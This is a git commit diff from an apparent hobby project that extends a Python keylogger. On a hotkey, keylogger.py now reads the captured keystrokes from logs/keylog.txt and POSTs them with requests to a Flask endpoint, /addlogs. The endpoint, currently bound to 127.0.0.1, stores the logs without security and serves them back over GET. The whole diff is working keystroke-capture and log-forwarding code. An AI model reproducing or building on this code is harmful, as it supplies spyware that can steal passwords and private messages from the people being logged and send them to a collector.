4b3b81ca5462c9842e8032bbc9f994abe5eaae48
Younes <yunzbailil@gmail.com>
2026-09-19 22:44:17 +0200

    key logs sent via REST at local running server, POST and GET working no sec

--- src/api.py
+++ src/api.py
@@ -4,18 +4,19 @@ app = Flask(__name__) #server instance
 
 logs = []
 
-#in lista di tuple
-with open("logs/keylog.txt", "r") as f:
-    for line in f:
-        line = line.strip()
 
-        if "=" not in line:
-            continue
+@app.post("/addlogs")
 
-        key, value = line.split("=", 1)
-        logs.append((key.strip(), value.strip()))
+def add_log():
+  # Get the JSON data sent from the other side
+  new_log = request.get_json()
 
-print(logs)
+  if not new_log:
+    return jsonify({"error": "No JSON data provided"}), 400
+
+  logs.append(new_log)
+  return jsonify({"message": "Log added successfully!", "log": new_log}), 201
+
 
 
 @app.get("/logs")
@@ -23,6 +24,9 @@ print(logs)
 def get_logs():
     return jsonify(logs)
 
+
+
+
+
 if __name__ == "__main__":
     app.run(host="127.0.0.1", port=3000)
-
--- src/keylogger.py
+++ src/keylogger.py
@@ -6,17 +6,38 @@ import os
 load_dotenv()
 env_key = os.getenv("HOT_KEY")
 
-log_file = "logs/keylog.txt"
+import requests
 
+
+log_file = "logs/keylog.txt"
+url = "http://127.0.0.1:3000/addlogs" #in locale per ora
 
 def on_hotkey():
     print("stopping...")
     listener.stop()
 
+    #in lista di tuple
+    payload = []
+    with open("logs/keylog.txt", "r") as f:
+        for line in f:
+            line = line.strip()
+
+            if "=" not in line:
+                continue
+
+            key, value = line.split("=", 1)
+            payload.append((key.strip(), value.strip()))
+
+
+    response = requests.post(url, json=payload)
+
+    print("Status Code:", response.status_code)
+    print("Response JSON:", response.json()) #se po pure toglie
+
 
 hotkey = keyboard.HotKey(
     keyboard.HotKey.parse(env_key), #when matched
-    on_hotkey #execute
+    on_hotkey #execute (stop listener)
 )
 
 
@@ -42,4 +63,5 @@ listener = keyboard.Listener(on_press=on_press,
                              on_release=on_release)
 listener.start()
 listener.join()
+
 
